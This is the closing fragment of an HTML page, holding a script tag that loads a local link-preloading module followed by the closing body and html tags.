    <script src="/libs/instantpage/instantpage.js" type="module"></script>
    

</body>

</html>
